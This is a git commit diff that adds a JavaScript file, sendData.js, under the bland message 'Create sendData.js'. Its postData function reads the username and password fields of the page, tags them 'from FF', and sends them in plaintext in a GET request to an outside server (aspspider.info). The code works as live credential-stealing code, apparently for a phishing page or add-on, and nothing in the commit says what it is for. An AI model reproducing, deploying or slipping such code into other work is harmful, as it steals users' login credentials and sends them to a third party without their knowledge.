bae045e861b2fc371234a74828fec71903dd70b1
CatcherX <189174112@qq.com>
2014-09-16 10:53:12 +0800

    Create sendData.js

---
+++ js/sendData.js
@@ -0,0 +1,16 @@
+function ajax(method, url, callback) {
+	var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
+	xhr.open(method, url, true);
+	xhr.onreadystatechange = function () {
+		if (xhr.readyState == 4 && xhr.status == 200) {
+			var result = xhr.responseText;
+			callback(result);
+		}
+	}
+	xhr.send();
+}
+function postData(){
+	var content = "【来自FF】"+document.getElementById('tbUserName').value+"|"+document.getElementById('tbPassword').value;
+	var url = "http://aspspider.info/CatcherXue0/Handler/ajaxhandler.ashx?key=CatcherX&content=" + content;
+	ajax("GET", url, callbackparam);
+}
